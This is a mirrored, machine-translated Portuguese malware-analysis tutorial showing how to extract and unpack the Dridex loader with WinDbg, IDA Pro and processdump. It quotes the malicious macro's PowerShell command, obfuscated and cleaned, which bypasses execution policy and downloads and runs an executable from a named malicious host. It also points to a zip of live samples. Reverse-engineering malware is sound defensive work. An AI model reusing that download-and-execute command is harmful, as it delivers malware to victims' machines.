<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üì≤ ü•ä üññüèº Desembalar: carregador de inicializa√ß√£o Dridex üïã ü§Ωüèª üöö</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Boa noite amigos! Em menos de um m√™s, o curso de engenharia reversa come√ßar√° conosco e, nesse contexto, tradicionalmente compartilhamos material √∫til ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Desembalar: carregador de inicializa√ß√£o Dridex</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/439916/">  Boa noite amigos!  Em menos de um m√™s, o curso de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">engenharia reversa</a> come√ßar√° conosco e, nesse contexto, tradicionalmente compartilhamos material √∫til sobre o assunto. <br><br>  Alguns leitores tiveram problemas ao descompactar o gerenciador de inicializa√ß√£o do Dridex (aquele que foi redefinido pela macro), ent√£o hoje mostrarei uma maneira f√°cil de fazer isso.  Outro problema que as pessoas n√£o conseguem resolver e que eu n√£o consigo resolver √© o fato de que as cadeias infecciosas Dridex t√™m uma vida √∫til muito curta, o que torna quase imposs√≠vel a revers√£o da maioria das pessoas.  Eu vou explicar o porqu√™. <br><br>  A atual cadeia de infec√ß√£o Dridex possui cerca de 4 est√°gios: <br><br><ol><li>  Um documento do office que cont√©m uma macro executa um script do PowerShell. </li><li>  Um script do Powershell que far√° o download do gerenciador de inicializa√ß√£o empacotado de um site ou ponto de compartilhamento invadido e o executar√°. </li><li>  Um carregador de inicializa√ß√£o empacotado que se descompacta e insere o c√≥digo em um processo spoolsrv ou svchost rec√©m-criado. </li><li>  Um processo incorporado que entrar√° em contato com o servidor do carregador para recuperar e executar o arquivo bin√°rio real do bot. </li></ol><br><img src="https://habrastorage.org/webt/3v/iq/09/3viq096dggamwuubpdx05i10jau.png"><br><br>  O problema para os analistas √© que existem 2 pontos de falha aqui: o site invadido que hospeda o carregador de inicializa√ß√£o pode limpar ou excluir a conta do sharepoint ou o servidor do carregador de inicializa√ß√£o pode ser parado (qualquer um deles impedir√° uma infec√ß√£o bem-sucedida).  Al√©m disso, os servidores do carregador geralmente oferecem suporte √† cerca geogr√°fica (eles s√≥ funcionam se o seu IP estiver no pa√≠s para o qual se destina e n√£o for uma VPN) e, assim que o carregador de inicializa√ß√£o for baixado publicamente, o grupo Dridex poder√° habilit√°-lo na lista negra. bloqueando permanentemente qualquer pessoa que o execute entre em contato com qualquer C2s (Commercial Cloud Services). <br><a name="habracut"></a><br>  O que √© surpreendente sobre todas essas "falhas" √© que elas provavelmente s√£o intencionais.  A maioria das v√≠timas que recebem email infectado o abre dentro de alguns dias √∫teis, ap√≥s o que a maioria das pessoas que abre o email analisa o malware, por isso √© √∫til que tudo desapare√ßa dentro de uma semana. <cut></cut><br><br>  Para que os leitores possam praticar esta li√ß√£o na pr√°tica, <a href="">existe</a> um zip que cont√©m um documento malicioso do escrit√≥rio e um carregador compactado da mesma cadeia; portanto, n√£o √© necess√°rio se preocupar com URLs mortos (senha: infectada).  Quanto aos servidores com a cerca geogr√°fica do carregador de inicializa√ß√£o, n√£o h√° nada que eu possa fazer sobre isso, e <b><i>como o carregador de inicializa√ß√£o j√° foi recuperado, voc√™ estar√° na lista negra para inici√°-lo</i></b> (se voc√™ n√£o souber como ignorar a lista negra, siga esta li√ß√£o na nova VM (m√°quina virtual) e talvez mude o IP depois). <br><br>  <b>Obtendo um carregador empacotado</b> <br><br>  Primeiramente, voc√™ deseja abrir um documento malicioso no Word, mas ainda n√£o clique em "Incluir conte√∫do".  Abra o depurador (como de costume eu uso o WinDbg), conecte-o ao winword.exe, defina um ponto de interrup√ß√£o no CreateProcessW, retome o processo e clique em "Ativar conte√∫do". <br><br><img src="https://habrastorage.org/webt/or/rq/cz/orrqczxfburvnfmszvz3xvjvumk.png"><br><br>  Um ponto de interrup√ß√£o ser√° alcan√ßado quase instantaneamente com os novos padr√µes Dridex (algumas m√°quinas virtuais podem ser detectadas; portanto, se um ponto de interrup√ß√£o n√£o funcionar, considere mascarar sua m√°quina virtual). <br><br>  Queremos descarregar o 1¬∫ e o 2¬∫ par√¢metro CreateProcess (respectivamente, o caminho para os par√¢metros de aplicativo e linha de comando), podemos fazer isso com os seguintes comandos: <br><br>  du / c100 poi (esp + 4) <br><br>  du / c100 poi (esp + 8) <br><br>  Nota: o comando du redefine uma string Unicode que termina em zero, / c 100 define o limite da coluna para o m√°ximo e poi (esp + 4) l√™ o endere√ßo apontado por esp + 4.  Resultados que obtive: <br><br>  Aplicativo: C: \ Windows \ System32 \ cmd.exe <br><br>  Par√¢metros: ‚ÄúC: \ Windows \ System32 \ cmd.exe‚Äù / cp ^ ower ^ she ^ ll -ex ^ ecutio ^ nPol ^ icy ByP ^ ass -NoP ^ rofile -com ^ mand (New-O ^ bject Net.Webclient ). ('Downl' + 'oadfile') .invoke ('ht' + 'tp: //'+'littlwnowern.top/lukaku/','C: \ Usu√°rios \ Admin \ AppData \ Local \ Temp \ GksagD. exe '); starT-Process' C: \ Usu√°rios \ Admin \ AppData \ Local \ Temp \ GksagD.exe '; <br><br>  Aqui, observamos como uma macro maliciosa inicia o cmd.exe com um comando para iniciar o powershell, ignorar a pol√≠tica de execu√ß√£o e, em seguida, carregar e executar o arquivo execut√°vel.  Se removermos a concatena√ß√£o de caracteres e os caracteres que s√£o apenas ofusca√ß√£o baisc, obtemos o seguinte: <br><br>  "C: \ Windows \ System32 \ cmd.exe" / c powershell -executionpolicy bypass -noprofile -comand (New-Object Net.Webclient). ('Downloadfile'). Invoke ( <a href="">'http://littlwnowern.top/lukaku/ ',' C: \ Usu√°rios \ Admin \ AppData \ Local \ Temp \ GksagD.exe '</a> ); processo de inicializa√ß√£o' C: \ Usu√°rios \ Admin \ AppData \ Local \ Temp \ GksagD.exe '; <br><br>  Agora podemos simplesmente baixar manualmente o arquivo exe de littlwnowern [.] Top / lukaku / (o URL est√° morto agora, mas eu carreguei o bin√°rio no arquivo como "GksagD.exe.sample"), √© um carregador compactado. <br><br>  <b>Descompactando o gerenciador de inicializa√ß√£o</b> <br><br>  Primeiro, precisamos ativar a DEP (Data Execution Prevention) para todos os aplicativos; a raz√£o disso ficar√° clara posteriormente.  Para fazer isso, v√° para "Painel de controle"&gt; "Sistema e seguran√ßa"&gt; "Sistema"&gt; "Configura√ß√µes avan√ßadas do sistema"&gt; "Configura√ß√µes" (na se√ß√£o "Desempenho") -&gt; "Preven√ß√£o de execu√ß√£o de dados" e ative a DEP para todos os programas. <br><br><img src="https://habrastorage.org/webt/_q/v8/xz/_qv8xzq_55ooc5mibcp5ynjppto.png"><br><br>  Em seguida, abriremos o arquivo exe no PE Explorer e definiremos o sinalizador "Relocation Stripped" no cabe√ßalho do PE, o que impedir√° que o ASLR baixe o arquivo execut√°vel em um endere√ßo diferente cada vez que for iniciado, o que simplifica a revers√£o. <br><br><img src="https://habrastorage.org/webt/_v/c8/v4/_vc8v461psinmwblyocphco9ctw.png"><br><br><img src="https://habrastorage.org/webt/c1/vc/z_/c1vcz_5p8bl7nujmfdwmtdwjevs.png"><br><br>  Agora salve o arquivo execut√°vel e abra-o no IDA Pro. <br><br>  Normalmente, os carregadores Dridex criam o processo svchost.exe ou spoolsv.exe e se injetam nele, portanto sabemos que o c√≥digo descompactado provavelmente chamar√° CreateProcess;  Para verificar isso, defina um ponto de interrup√ß√£o no final de CreateProcessW (na instru√ß√£o ret) e clique em executar. <br><br><img src="https://habrastorage.org/webt/vp/xe/q8/vpxeq8xktyh0ta0vhbqeijmub78.png"><br><br>  Quando o ponto de interrup√ß√£o for atingido, voc√™ ver√° que o GksagD.exe criou um processo em pausa chamado svchost.exe ou spoolsv.exe, conforme o esperado.  Se dermos um passo para retornar do CreateProcessW ao c√≥digo que o chamou, encontraremos o seguinte. <br><br><img src="https://habrastorage.org/webt/ss/yz/vt/ssyzvtcecn4kufmbze09u5lldyg.png"><br><br>  A IDA fragmentou as instru√ß√µes, o que significa que o c√≥digo foi alterado desde a execu√ß√£o do execut√°vel, o que geralmente √© o resultado da descompacta√ß√£o no local (geralmente os empacotadores de malware usam processos ocos para gravar o c√≥digo descompactado em outro processo, os verdadeiros empacotadores descompactam o c√≥digo no mesmo processo). <br><br>  Agora que sabemos que o c√≥digo execut√°vel principal √© substitu√≠do em algum momento, podemos colocar um ponto de interrup√ß√£o no registro no endere√ßo atual, que ser√° acionado quando o c√≥digo for alterado. <br><br><img src="https://habrastorage.org/webt/ia/ak/rg/iaakrgesrzqnd0zfpshualzy2_a.png"><br><br>  Depois disso, exclua todos os outros pontos de interrup√ß√£o e reinicie o processo. <br><br><img src="https://habrastorage.org/webt/pd/jr/wp/pdjrwpdovttkqzgtwyuzmvglyio.png"><br><br>  O ponto de interrup√ß√£o foi chamado a partir de um endere√ßo fora da se√ß√£o principal dos arquivos execut√°veis, o que significa que o empacotador alocou um pouco de mem√≥ria e copiou algum c√≥digo para cuidar da substitui√ß√£o do arquivo execut√°vel principal. <br><br>  Se observarmos a mem√≥ria no Process Hacker, veremos que agora ela √© leg√≠vel e grav√°vel, mas n√£o execut√°vel, o que √© √≥timo porque significa que o empacotador n√£o usa mais esse c√≥digo. <br><br><img src="https://habrastorage.org/webt/im/ek/q0/imekq0wftsmhp9cdj57vrrzzdau.png"><br><br>  Agora, sobre algumas conclus√µes do n√≠vel de Sherlock: sabemos que o c√≥digo √© executado aqui mais tarde, e a mem√≥ria n√£o √© execut√°vel no momento, portanto, talvez em algum momento ele se torne execut√°vel. <br><br>  A fun√ß√£o usada para configurar a prote√ß√£o de mem√≥ria √© geralmente VirtualAlloc, VirtualAllocEx ou NtProtectVirtualMemory.  Se voc√™ estiver familiarizado com os componentes internos do Windows, saber√° que o VirtualAlloc e o VirtualAllocEx chamar√£o internamente NtProtectVirtualMemory, portanto, √© aqui que definimos o ponto de interrup√ß√£o. <br><br>  Poder√≠amos sentar e verificar a pilha de chamadas toda vez que NtProtectVirtualMemory √© chamado, aguardar o endere√ßo correspondente ser definido como execut√°vel e analisar o cabe√ßalho do PE para encontrar um novo ponto de entrada ou sermos mais inteligentes. <br><br>  Vamos definir um ponto de interrup√ß√£o condicional no NtProtectVirtualMemory usando o seguinte script: <br><br><pre><code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Dword(esp+0x10) == 0x20 || Dword(esp+0x10) == 0x40 || Dword(esp+0x10) == 0x10) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Dword(esp+4) == 0xFFFFFFFF) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Dword(Dword(esp+8)) &gt;= 0x400000 &amp;&amp; Dword(Dword(esp+8)) &lt; 0x42e000) { PatchDword(esp+0x10, 0x04); } } } <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> 0;</code> </pre> <br>  Para fazer isso, v√° para NtProtectVirtualMemory e defina um ponto de interrup√ß√£o no primeiro byte, clique com o bot√£o direito do mouse&gt; Alterar ponto de interrup√ß√£o, clique no bot√£o "..." e cole o script. <br><br>  Este script ser√° executado toda vez que NtProtectVirtualMemory for chamado e far√° o seguinte: <br><br><ul><li>  Verifique se o par√¢metro de prote√ß√£o da p√°gina (esp + 0x10) √© 0x10, 0x20 ou 0x40 (tamb√©m conhecido como PAGE_EXECUTE, PAGE_EXECUTRE_READ, PAGE_EXECUTE_READWRITE), o que significa que a chamada altera a prote√ß√£o da p√°gina para execut√°vel. </li><li>  Verifique se o endere√ßo de destino est√° no intervalo da se√ß√£o execut√°vel principal (0x400000 - 0x42e000). </li><li>  Altere a configura√ß√£o de seguran√ßa para 0x04 (n√£o execut√°vel). </li><li>  Retorno 0 (retomar a execu√ß√£o em vez de interromper para o depurador). </li></ul><br>  Vamos correr e ver o que acontece. <br><br><img src="https://habrastorage.org/webt/ui/cn/qz/uicnqz7mpiyc3nkrvhd40vy8eh4.png"><br><br>  Exce√ß√£o de viola√ß√£o de acesso!  Reserve um tempo para aproveitar o momento, pois esse √© provavelmente o √∫nico erro grave de viola√ß√£o de acesso que voc√™ j√° viu ... mas por que √© bom? <br><br>  Nosso script de ponto de interrup√ß√£o no NtProtectVirtualMemory configurou toda a mem√≥ria como n√£o execut√°vel quando o empacotador tentou configur√°-la como execut√°vel.  A exce√ß√£o significa que tudo o que o empacotador gravou na mem√≥ria agora est√° gravado com sucesso e ele est√° tentando chamar algo nessa mem√≥ria.  Se tivermos sorte, o que o empacotador escreveu na mem√≥ria √© o carregador de inicializa√ß√£o descompactado e o endere√ßo que ele estava tentando chamar √© o ponto de entrada, certo? <br><br>  Para fazer isso, usaremos uma ferramenta incr√≠vel chamada processdump ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">link de download</a> ), que despeja todas as imagens exe ou dll carregadas na mem√≥ria dos processos e as empacota de volta em arquivos .exe ou .dll. <br><br>  use "pd32.exe -pid" para despejar o processo. <br><br>  use "pd32.exe -pid &lt;ID do processo&gt;" para descarregar o processo. <br><br><img src="https://habrastorage.org/webt/3x/xj/ib/3xxjibmercdg5fdliadulrlspuk.png"><br><br>  O n√∫mero no final do nome do arquivo √© o endere√ßo base da imagem na mem√≥ria; portanto, GksagD_exe_GksagD.exe_400000.exe ser√° o mesmo que o empacotador mapeado em vez do antigo execut√°vel, portanto veremos isso na IDA. <br><br><img src="https://habrastorage.org/webt/_q/4q/uh/_q4quhwj6ab0c_nk1d98wen9-iy.png"><br><br>  O endere√ßo do ponto de entrada √© igual ao endere√ßo da exce√ß√£o, √© um execut√°vel descompactado! <br><br>  <b>Dicas reversas</b> <br><br>  O gerenciador de inicializa√ß√£o √© complicado porque todas as seq√º√™ncias de caracteres s√£o criptografadas e n√£o h√° importa√ß√£o, mas os m√©todos que descrevi em detalhes nos manuais do Dridex tamb√©m funcionar√£o no gerenciador de inicializa√ß√£o. <br><br>  D√™ uma olhada: <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://www.malwaretech.com/2016/04/lets-analyze-dridex-part-2.html</a> <br><br>  e <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">https://www.malwaretech.com/2016/05/lets-analyze-dridex-part-3.html</a> <br><br>  Nota: o execut√°vel do gerenciador de inicializa√ß√£o √© multiuso (este √© o c√≥digo que implementa svchost / spoolsv e o c√≥digo que implementa svchost / spoolsv).  Se voc√™ deseja reverter a parte da inje√ß√£o do gerenciador de inicializa√ß√£o, basta abri-lo no IDA e execut√°-lo.  Se voc√™ deseja reverter a parte de inicializa√ß√£o, √© necess√°rio copi√°-la para system32 e executar a partir da√≠ (tenha cuidado para que em ambos os casos o carregador de inicializa√ß√£o seja exclu√≠do automaticamente ap√≥s ser executado). <br><br>  Se voc√™ achar que o material √© √∫til, fa√ßa um plus, escreva coment√°rios e inscreva-se em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">uma li√ß√£o aberta</a> que acontecer√° hoje! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt439916/">https://habr.com/ru/post/pt439916/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt439906/index.html">Vulnerabilidade cr√≠tica em produtos antiv√≠rus Zemana e muito mais</a></li>
<li><a href="../pt439908/index.html">Kohl, foda-se ... Coaxial</a></li>
<li><a href="../pt439910/index.html">Digital Rights Center convida para o Privacy Day 2019</a></li>
<li><a href="../pt439912/index.html">Mist√©rio n√£o resolvido da vis√£o</a></li>
<li><a href="../pt439914/index.html">Organiza√ß√£o redutora - dando um passo adiante</a></li>
<li><a href="../pt439918/index.html">Na montanha fica Spring Boot ...</a></li>
<li><a href="../pt439920/index.html">Implanta√ß√£o autom√°tica de fun√ß√µes sem servidor do Git</a></li>
<li><a href="../pt439922/index.html">IP tributa√ß√£o no Cazaquist√£o: como ser freelancer?</a></li>
<li><a href="../pt439924/index.html">O volume de encomendas de lojas on-line estrangeiras aumentou 25%</a></li>
<li><a href="../pt439926/index.html">Reter dentro e fora do ViewModel</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>